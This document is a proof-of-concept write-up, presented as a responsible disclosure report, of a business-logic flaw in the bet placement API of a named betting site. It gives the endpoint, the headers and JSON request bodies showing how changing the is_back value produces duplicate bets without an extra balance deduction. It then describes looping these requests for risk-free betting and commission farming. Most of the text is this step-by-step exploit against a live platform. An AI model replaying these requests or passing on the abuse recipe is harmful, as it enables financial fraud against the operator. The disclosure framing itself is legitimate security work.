The vulnerability enables an attacker to manipulate the bet placement API on jmd24x7.com and conduct commission farming or risk-free betting by exploiting inconsistent business logic in handling “back” and “lay” bets. Here is a professional proof-of-concept suitable for inclusion in a responsible disclosure report.

## **API Endpoint and Parameters**

* Endpoint: POST /api/bet/placeFancyBet  
* Host: jmd24x7.com  
* Key Request Headers:  
  * Authorization  
  * Cookie (session tokens)  
  * Content-Type: application/json  
* Body Parameters:  
  * fancy\_id (Bet identifier)  
  * run (Bet runs)  
  * stack & size (Bet amount)  
  * is\_back ("1" for back, "0" for lay, "2" for manipulated lay-back scenario)

## **Proof of Concept Steps**

## **1\. Place Initial “Lay” Bet**

json

`POST /api/bet/placeFancyBet`  
`{`  
  `"fancy_id": "35018051_7",`  
  `"run": 72,`        
  `"stack": 100,`  
  `"size": 100,`  
  `"is_back": "0"`  
`}`

*This request successfully places a lay bet for 72 runs with a ₹100 stake. ₹100 is deducted from the user's balance.*

## **2\. Exploit “is\_back” Parameter with Manipulated Runs Value**

* Change is\_back from “0” to “1” or “2”, set run to appropriate value (back scenario for 72 runs).  
* Place bet with the following:

json

`{`  
  `"fancy_id": "35018051_7",`  
  `"run": 72,`  
  `"stack": 100,`  
  `"size": 100,`  
  `"is_back": "2"`  
`}`

Or

json

`{`  
  `"fancy_id": "35018051_7",`  
  `"run": 72,`  
  `"stack": 100,`  
  `"size": 100,`  
  `"is_back": "1"`  
`}`

*The API now returns a success message and issues the same outcome as the initial bet—bet appears twice on the same outcome, balance is not deducted again, and, crucially, the commission is applied to the sum of both bets, increasing the commission received.*

## **3\. Abuse: Loop the Process**

* If the requests above are repeated, the attacker can place multiple "Yes" bets ("is\_back":"1") for free, with only one deduction but multiple instances.  
* Upon conclusion, either the run wins (attacker profits for free) or loses (no balance lost), but the system still awards commission on total stacked amount (in this case, 3% of ₹200 \= ₹6).

## **Impact Statement**

* Risk-Free Betting: Allows users to multiply bet instances without additional funds staked.  
* Commission Farming: Attacker gets credited commission (3%) on phantom bets, directly abusing platform financials.  
* Balance Manipulation: User’s balance may remain unaffected or reimbursed while appearing to have legitimate bets.  
* Business Logic Flaw: Core logic on bet uniqueness and money deduction is bypassed.

## **Session/Bets Table Example**

| Session | Rate | Amount | Run | Mode | Dec | P\&L |
| :---- | :---- | :---- | :---- | :---- | :---- | :---- |
| 10 over runs MS W vs SS W | 100 | 100 | 72 | Yes |  | 100 |
| 10 over runs MS W vs SS W | 100 | 100 | 72 | Yes |  | 100 |
| 10 over runs MS W vs SS W | 100 | 100 | 72 | No |  | 100 |
| 10 over runs MS W vs SS W | 100 | 100 | 72 | Yes |  | 100 |

